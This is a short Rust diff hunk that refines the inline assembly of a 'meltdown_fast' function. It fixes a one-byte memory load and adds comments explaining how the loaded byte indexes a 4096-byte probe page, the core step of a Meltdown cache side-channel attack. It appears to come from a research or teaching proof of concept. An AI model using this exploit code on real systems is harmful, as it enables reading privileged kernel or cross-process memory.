@@ -35,9 +35,9 @@ pub struct Config {
 pub fn meltdown_fast(mem: &[MemoryPage], pointer: *const u8) {
     unsafe {
         asm!(
-            "mov {tmp}, [{x}]",
-            "shl {tmp}, 12",
-            "mov {tmp2}, [{base}+{tmp}]",
+            "movzx {tmp}, BYTE PTR [{x}]", // BYTE PTR is required to speciy that we only want to load one byte from that address. movzx requires the operand size to be specified, to know how much needs to be filled with 0. The resulting instruction will be "movzbq"
+            "shl {tmp}, 12", // Multiply by 4096, as we want to address one entire page based on the loaded value
+            "mov {tmp2}, [{base}+{tmp}]", // Access the page with the index of the loaded value
             x = in(reg) pointer,
             base = in(reg) &mem[0] as *const MemoryPage,
             tmp = out(reg) _,
